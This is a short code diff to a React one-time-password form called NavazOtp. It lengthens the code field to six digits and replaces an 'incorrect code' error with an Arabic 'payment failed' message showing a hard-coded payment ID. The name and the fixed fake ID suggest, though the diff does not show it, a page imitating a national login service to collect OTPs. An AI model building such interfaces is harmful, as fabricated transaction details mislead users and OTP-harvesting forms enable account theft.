@@ -83,8 +83,9 @@ const NavazOtp = ({ setMode, checkMode }) => {
             required
             onChange={(e) => setOtp(e.target.value)}
             dir="ltr"
+            placeholder="******"
             inputMode="numeric"
-            minLength={4}
+            minLength={6}
             type="text"
             className="border px-3 py-1  border-gray-300 text-base text-right outline-[#ffc107] rounded-md w-full"
           />
@@ -124,7 +125,8 @@ const NavazOtp = ({ setMode, checkMode }) => {
               onClick={() => window.location.reload()}
             />
             <div className="flex flex-col w-full items-center justify-center">
-              <span>كود التحقق غير صحيح</span>
+              <span>نتيجة الدفع فشل معرف الدفع </span>
+              <span>82A27833M4589370G</span>
             </div>
             <button
               className="bg-gray-900 text-white w-11/12 py-3"
